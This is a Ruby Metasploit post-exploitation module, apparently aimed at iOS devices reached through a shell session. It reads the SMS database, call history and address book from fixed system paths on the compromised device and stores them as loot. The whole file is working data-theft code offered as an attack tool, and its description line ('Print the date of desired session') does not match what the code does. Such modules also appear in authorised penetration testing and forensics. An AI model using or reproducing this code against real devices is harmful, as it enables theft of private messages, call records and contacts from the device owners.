##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Post::File

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'OSX Gather ios Store SMS',
        'Description'   => %q{
          'Print the date of desired session.'
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Dyme' ],
        'Platform'      => [ 'osx' ],
        'SessionTypes'  => [ 'shell' ]
    ))
    register_options(
      [
        OptBool.new('SMS',  [false, 'Collect SMS database', true]),
        OptBool.new('CALL', [false, 'Collect call history databse', true]),
        OptBool.new('CONTACTS', [false, 'Collect contacts database', true]),
      ], self.class)
  end

  def run
    if (datastore['SMS'])
      sms_file = read_file("/private/var/mobile/Library/SMS/sms.db")
      p1 = store_loot("sms.db", "binary/db", session, sms_file, "sms.db", "ios sms database")
      print_good("SMS database saved: #{p1.to_s}")
    end
    if (datastore['CALL'])
      calldb_file = read_file("/private/var/mobile/Library/CallHistoryDB/CallHistory.storedata")
      p1 = store_loot("CallHistory.storedata", "binary/db", session, calldb_file, "CallHistory.db", "ios call history")
      print_good("Call history database saved: #{p1.to_s}")
    end
    if (datastore['CONTACTS'])
      contacts_file = read_file("/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb")
      p1 = store_loot("AddressBook.sqlitedb", "binary/db", session, contacts_file, "AddressBook.db", "ios contacts database")
      print_good("Contacts database saved: #{p1.to_s}")
    end
  end

end